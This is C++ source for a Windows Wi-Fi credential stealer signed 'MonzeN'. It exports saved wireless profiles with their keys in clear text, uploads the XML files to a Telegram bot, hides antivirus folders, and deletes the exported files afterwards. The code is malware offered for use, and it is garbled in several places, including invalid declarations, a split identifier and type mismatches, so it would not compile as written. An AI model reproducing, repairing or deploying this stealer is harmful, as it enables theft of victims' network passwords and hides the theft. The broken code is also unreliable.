#include <iostream> 
#include <fstream> 
#include <cstdlib> 
#include <string> 
#include <vector> 
#include <Windows.h> 
#include <WinInet.h> 
#pragma comment(lib, "wininet.lib") 

using namespace std; 

void start(string name) { 
    string user = getenv("USERNAME"); 
    string filepath = "C:/Users/"+ user + "/Desktop/wifi/.bat/" + name + ".bat"; 
    string command = "runas /user:"+ user + " \"" + filepath + "\""; 
    system(command.c_str()); 
} 

int main() { 
    string TOKEN = "YOUR_TOKEN_HERE"; 
    string CHAT_ID = "YOUR_CHAT_ID_HERE";
    string url = "https://api.telegram.org/bot" + TOKEN + "/sendDocument?chat_id=" + CHAT_ID; 

    vector<string> Antivirus = { "Windows Defender", "Avast", "AVG", "Avira", 
                                 "Advanced SystemCare", "Bitdefender", "Dr.Web", 
                                 "ESET", "Kaspersky Lab", "360 Total Security", 
                                 "ESET NOD32" }; 
    vector<string> paths = { "C:\\Program Files\\Windows Defender", 
                             "C:\\Program Files\\AVAST Software\\Avast", 
                             "C:\\Program Files\\AVG\\Antivirus", 
                             "C:\\Program Files (x86)\\Avira\\Launcher", 
                             "C:\\Program Files (x86)\\IObit\\Advanced SystemCare", 
                             "C:\\Program Files\\Bitdefender Antivirus Free", 
                             "C:\\Program Files\\DrWeb", 
                             "C:\\Program Files\\ESET\\ESET Security", 
                             "C:\\Program Files (x86)\\Kaspersky Lab", 
                             "C:\\Program Files (x86)\\360\\Total Security", 
                             "C:\\Program Files\\ESET\\ESET NOD32 Antivirus" }; 
    for (string path : paths) { 
        if (GetFileAttributesA(path.c_str()) != INVALID_FILE_ATTRIBUTES) { 
            Antivirus.push_back(path); 
        } 
    } 

    string wlanlist[] = { "wlan10", "wlan7", "wlanXP" }; 

    string system = OSVERSIONINFOA osvi; 
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA); 
    GetVersionExA(&osvi); 
    if (osvi.dwMajorVersion == "10") { 
        start(wlanlist[0]); 
    } 
    else if (osvi.dwMajorVersion == "7") { 
        start(wlanlist[1]); 
    } 
    else if (osvi.dwMajorVersion == "XP") { 
        start(wlanlist[2]); 
    } 

    system("netsh wlan export profile key=clear"); 
    string ip = ""; 

    // Download IP address using WinInet
    HINTERNET hSession = InternetOpen(L"MyAgent", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (hSession) {
        HINTERNET hConnect = InternetConnect(hSession, L"myip.dnsomatic.com", INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
        if (hConnect) {
            // Send HTTP request
            HINTERNET hRequest = HttpOpenRequest(hConnect, L"GET", L"/", NULL, NULL, NULL, 0, 1);
            HttpSendRequest(hRequest, NULL, 0, NULL, 0);

            // Read response
            DWORD bufferSize = 512;
            char buffer[512];
            DWORD bytesRead = 0;
            while (InternetReadFile(hRequest, buffer, bufferSize, &bytesRead) && bytesRead != 0) {
                ip.append(buffer, bytesRead);
            }
            InternetCloseHandle(hRequest);
        }
        InternetCloseHandle(hConnect);
    }
    InternetCloseHandle(hSession);

    ip.erase(remove(ip.begin(), ip.end(), '\n'), ip.end());
    ip.erase(remove(ip.begin(), ip.end(), '\r'), ip.end());

    for (string file : Antivirus) { 
        string command = "attrib +h \"" + file + "\""; 
        system(command.c_str()); 
    } 

    for (string file : Antivirus) { 
        string path = file + "/Wi-Fi.xml"; 
        string command = "attrib -h \"" + path + "\""; 
        system(command.c_str()); 

        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
        if (so
    ck == INVALID_SOCKET) {
            continue;
        }

        hostent* h = gethostbyname("api.telegram.org");
        if (!h) {
            closesocket(sock);
            continue;
        }

        sockaddr_in sAddr;
        memset(&sAddr, 0, sizeof(sAddr));
        sAddr.sin_family = AF_INET;
        sAddr.sin_port = htons(443);
        sAddr.sin_addr.S_un.S_addr = *((unsigned long*)(h->h_addr));

        if (connect(sock, (sockaddr*)&sAddr, sizeof(sAddr)) != 0) {
            closesocket(sock);
            continue;
        }

        stringstream ss;
        ss << "POST /bot" << TOKEN << "/sendDocument HTTP/1.1\r\n"
            << "Host: api.telegram.org\r\n"
            << "Content-Type: multipart/form-data; boundary=------------------------13d1b6c9e72b6130\r\n"
            << "User-Agent: curl/7.68.0\r\n"
            << "Content-Length: " << fileSize(path) + 906 << "\r\n"
            << "Connection: Close\r\n\r\n"
            << "--------------------------13d1b6c9e72b6130\r\n"
            << "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n"
            << CHAT_ID << "\r\n"
            << "--------------------------13d1b6c9e72b6130\r\n"
            << "Content-Disposition: form-data; name=\"document\"; filename=\"" << path << "\"\r\n"
            << "Content-Type: application/xml\r\n\r\n";
        send(sock, ss.str().c_str(), ss.str().length(), 0);

        ifstream fin(path, ios::binary);
        char chunk[1024];
        while (fin.read(chunk, sizeof(chunk)).gcount() > 0) {
            send(sock, chunk, fin.gcount(), 0);
        }

        // Send end of file marker
        if (fin.eof() && fin.gcount() == 0) {
            char eofMarker[] = { '\r', '\n', '-', '-', '-', '-', '-', '-', '-', '-', '-', '1', '3', 'd', '1', 'b', '6', 'c', '9', 'e', '7', '2', 'b', '6', '1', '3', '0', '-', '-', '-', '-', '-', '-', '\r', '\n', '\r', '\n' };
            send(sock, eofMarker, sizeof(eofMarker), 0);
        }

        // Read response from server
        char recvBuffer[1024];
        int numBytesReceived = recv(sock, recvBuffer, sizeof(recvBuffer), 0);
        if (numBytesReceived > 0) {
            string response(recvBuffer, numBytesReceived);
            if (response.find("\"ok\":true") == string::npos) {
                cerr << "Failed to upload file " << path << endl;
            }
        }

        closesocket(sock);
    } 

    string message = "https://api.telegram.org/bot" + TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&parse_mode=html&text=Wi-Fi hack by MonzeN"; 
    system(message.c_str()); 

    for (string file : Antivirus) { 
        string path = file + "/Wi-Fi.xml"; 
        string command = "del " + path; 
        system(command.c_str()); 
    } 

    return 0; 
} 

DWORD fileSize(string path) {
    WIN32_FILE_ATTRIBUTE_DATA fileData;
    if (!GetFileAttributesEx(path.c_str(), GetFileExInfoStandard, &fileData)) {
        return 0;
    }

    LARGE_INTEGER fileSize;
    fileSize.HighPart = fileData.nFileSizeHigh;
    fileSize.LowPart = fileData.nFileSizeLow;

    return fileSize.QuadPart;
}